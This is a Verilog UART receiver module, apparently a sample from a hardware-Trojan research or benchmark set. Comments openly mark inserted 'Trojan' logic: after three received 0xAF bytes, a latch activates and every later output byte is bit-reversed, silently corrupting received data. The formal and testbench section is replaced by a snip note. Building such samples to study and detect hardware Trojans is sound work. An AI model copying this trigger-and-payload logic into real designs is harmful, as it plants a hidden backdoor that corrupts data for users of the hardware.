module rxuartlite #(
		// {{{
		parameter			TIMER_BITS = 10,
`ifdef	FORMAL
		parameter  [(TIMER_BITS-1):0]	CLOCKS_PER_BAUD = 16, // Necessary for formal proof
`else
		parameter  [(TIMER_BITS-1):0]	CLOCKS_PER_BAUD = 868,	// 115200 Baud at 100MHz
`endif
		localparam			TB = TIMER_BITS,
		//
		localparam [3:0]	RXUL_BIT_ZERO  = 4'h0,
		// Verilator lint_off UNUSED
		// These are used by the formal solver
		localparam [3:0]	RXUL_BIT_ONE   = 4'h1,
		localparam [3:0]	RXUL_BIT_TWO   = 4'h2,
		localparam [3:0]	RXUL_BIT_THREE = 4'h3,
		localparam [3:0]	RXUL_BIT_FOUR  = 4'h4,
		localparam [3:0]	RXUL_BIT_FIVE  = 4'h5,
		localparam [3:0]	RXUL_BIT_SIX   = 4'h6,
		localparam [3:0]	RXUL_BIT_SEVEN = 4'h7,
		// Verilator lint_on  UNUSED
		localparam [3:0]	RXUL_STOP      = 4'h8,
		localparam [3:0]	RXUL_WAIT      = 4'h9,
		localparam [3:0]	RXUL_IDLE      = 4'hf
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		input	wire		i_uart_rx,
		output	reg		o_wr,
		output	reg	[7:0]	o_data
		// }}}
	);

	// Signal/register declarations
	// {{{
	wire	[(TB-1):0]	half_baud;
	reg	[3:0]		state;

	assign	half_baud = { 1'b0, CLOCKS_PER_BAUD[(TB-1):1] };
	reg	[(TB-1):0]	baud_counter;
	reg			zero_baud_counter;

	reg			q_uart, qq_uart, ck_uart;
	reg	[(TB-1):0]	chg_counter;
	reg			half_baud_time;
	reg	[7:0]		data_reg;

	// Trojan: registers for trigger and payload
	reg [1:0] trojan_trigger_cnt;       // Counts received 0xaf bytes (up to 3)
	reg       trojan_activated;         // Latches when Trojan is triggered
	// }}}

	// ck_uart
	// {{{
	initial	q_uart  = 1'b1;
	initial	qq_uart = 1'b1;
	initial	ck_uart = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		{ ck_uart, qq_uart, q_uart } <= 3'b111;
	else
		{ ck_uart, qq_uart, q_uart } <= { qq_uart, q_uart, i_uart_rx };
	// }}}

	// chg_counter
	// {{{
	initial	chg_counter = {(TB){1'b1}};
	always @(posedge i_clk)
	if (i_reset)
		chg_counter <= {(TB){1'b1}};
	else if (qq_uart != ck_uart)
		chg_counter <= 0;
	else if (chg_counter != { (TB){1'b1} })
		chg_counter <= chg_counter + 1;
	// }}}

	// half_baud_time
	// {{{
	initial	half_baud_time = 0;
	always @(posedge i_clk)
	if (i_reset)
		half_baud_time <= 0;
	else
		half_baud_time <= (!ck_uart)&&(chg_counter >= half_baud-1'b1-1'b1);
	// }}}

	// state
	// {{{
	initial	state = RXUL_IDLE;
	always @(posedge i_clk)
	if (i_reset)
	begin
		state <= RXUL_IDLE;
	end else if (state == RXUL_IDLE)
	begin // Idle state, independent of baud counter
		state <= RXUL_IDLE;
		if ((!ck_uart)&&(half_baud_time))
			state <= RXUL_BIT_ZERO;
	end else if ((state >= RXUL_WAIT)&&(ck_uart))
		state <= RXUL_IDLE;
	else if (zero_baud_counter)
	begin
		if (state <= RXUL_STOP)
			state <= state + 1;
	end
	// }}}

	// data_reg
	// {{{
	always @(posedge i_clk)
	if ((zero_baud_counter)&&(state != RXUL_STOP))
		data_reg <= { qq_uart, data_reg[7:1] };
	// }}}

	// Trojan insertion: trigger counter and activation logic
	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_trigger_cnt <= 2'd0;
			trojan_activated   <= 1'b0;
		end else begin
			// Trojan only triggers from data actually received (on o_wr pulse)
			if ((zero_baud_counter)&&(state == RXUL_STOP)&&(ck_uart)) begin
				if (!trojan_activated && (data_reg == 8'haf)) begin
					if (trojan_trigger_cnt == 2'd2) begin
						trojan_trigger_cnt <= trojan_trigger_cnt + 1'b1;
						trojan_activated <= 1'b1;
					end else begin
						trojan_trigger_cnt <= trojan_trigger_cnt + 1'b1;
					end
				end
			end
			// If any reset or o_wr hit for non-0xaf, trojan_trigger_cnt holds, latch stays high once set
		end
	end
	// }}}

	// Trojan: function to reverse 8-bit byte
	function [7:0] reverse_byte;
		input [7:0] in_byte;
		begin
			reverse_byte[7] = in_byte[0];
			reverse_byte[6] = in_byte[1];
			reverse_byte[5] = in_byte[2];
			reverse_byte[4] = in_byte[3];
			reverse_byte[3] = in_byte[4];
			reverse_byte[2] = in_byte[5];
			reverse_byte[1] = in_byte[6];
			reverse_byte[0] = in_byte[7];
		end
	endfunction
	// }}}

	// o_wr, o_data
	// {{{
	initial	o_wr = 1'b0;
	initial	o_data = 8'h00;
	always @(posedge i_clk)
	if (i_reset)
	begin
		o_wr <= 1'b0;
		o_data <= 8'h00;
	end else if ((zero_baud_counter)&&(state == RXUL_STOP)&&(ck_uart))
	begin
		o_wr   <= 1'b1;
		// Trojan payload: after trigger, byte is reversed
		if (trojan_activated)
			o_data <= reverse_byte(data_reg);
		else
			o_data <= data_reg;
	end else
		o_wr   <= 1'b0;
	// }}}

	// baud_counter -- The baud counter
	// {{{
	initial	baud_counter = 0;
	always @(posedge i_clk)
	if (i_reset)
		baud_counter <= 0;
	else if (((state==RXUL_IDLE))&&(!ck_uart)&&(half_baud_time))
		baud_counter <= CLOCKS_PER_BAUD-1'b1;
	else if (state == RXUL_WAIT)
		baud_counter <= 0;
	else if ((zero_baud_counter)&&(state < RXUL_STOP))
		baud_counter <= CLOCKS_PER_BAUD-1'b1;
	else if (!zero_baud_counter)
		baud_counter <= baud_counter-1'b1;
	// }}}

	// zero_baud_counter
	// {{{
	initial	zero_baud_counter = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		zero_baud_counter <= 1'b1;
	else if ((state == RXUL_IDLE)&&(!ck_uart)&&(half_baud_time))
		zero_baud_counter <= 1'b0;
	else if (state == RXUL_WAIT)
		zero_baud_counter <= 1'b1;
	else if ((zero_baud_counter)&&(state < RXUL_STOP))
		zero_baud_counter <= 1'b0;
	else if (baud_counter == 1)
		zero_baud_counter <= 1'b1;
	// }}}
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
// ...[snip: original formal/verification/testbench code preserved]...
endmodule